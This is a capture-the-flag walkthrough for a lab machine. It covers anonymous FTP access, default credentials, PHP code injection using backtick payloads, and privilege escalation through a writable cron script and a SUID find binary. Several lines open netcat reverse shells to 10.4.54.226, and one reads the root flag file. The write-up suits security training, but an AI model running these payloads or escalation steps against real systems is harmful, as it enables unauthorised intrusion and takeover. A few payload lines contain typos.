 2. FTP Anonymous Login
 The output of it we will see that we have anonymous access to ftp server on `port 21`
 
     ftp <ip>

        username: anonymous
        passsword: anything
    
then you will find a directory called pub in which inside it has a dockfile which you cam download it through

    get manifest.docs
    
Then navigate to the directory you downloaded and open it to read what is inside. 
It is nothing but a was to use backticks tricks to bypass php filters
  so every thing suspicious is terminated. So using backticks you completely bypass it
 
 3. Web service Enumeration
 
    * navigating to the the web page using the `VPN` ip provided we can see that there is default ubuntu page
           ![](images/page.png)
     * Viewing source codes we found there i some comments which is suspecious and it looks like base64 encoded string   
         
          ![](images/footer.png)
         so decoding it as `base64` we can see the out put is
              
                 echo "L2JhY2t0aWNrcwo="|base64 -d                                                                   130 тип
                       /backticks
                       
 so going to `http://<ip>/backticks` we can see the login page now
   trying the deafult usernames and passwords found that `username=admin&& password=admin`
   loggin in we can see that there is a ordering system. Going through it we can see there is `game` to play..
    trying `xss` was possible.
      Example 
      
         <script>alert('xss')</script>
         
  Since our aim is to gain full access to the system, so let's try to execute system comand by `php code injection`
  many payloads failed but since from `ftp server` i learned something `backticks` i tryed to use backticks triks to execute commandds
  
  
  example 
  
    ${print `ls`}
    $print `pwd`}
    ${print `nc -e /bin/bash 10.4.54.226 1191`}
  Then we get reverse shell on backticks as user techguy, so we can submit our user.txt
                 
 ### privilege escation
 
 
   * look at crontabs you may find editable to everybody scripts and it is run as user john so you cat get the user malwarepeter shell now
             
                      # cat /etc/crontab
                                 
                        # /etc/crontab: system-wide crontab
                        # Unlike any other crontab you don't have to run the `crontab'
                        # command to install the new version when you edit this file
                        # and files in /etc/cron.d. These files also have username fields,
                        # that none of the other crontabs do.

                        SHELL=/bin/sh
                        PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

                        # m h dom mon dow user  command
                        17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
                        25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
                        47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
                        52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

                        # user malwarepeter
                        *  *    * * * malwarepeter /opt/script.sh
So editing the file and putting in reverseshell payload like

    nc -e /bin/bash 10.4.54.226 1234
    
Then waiting for few minutes for cronjob to run and get malwarepeter shell on the netcat listerner
  
  #### root  privilege escation
   * To be root just find suid binaries with command like
 
             find / -perm -u=s -type f 2>/dev/null
   * find has SUID so we can use it to read root file like
       
          find . -exec cat /root/root.txt \;
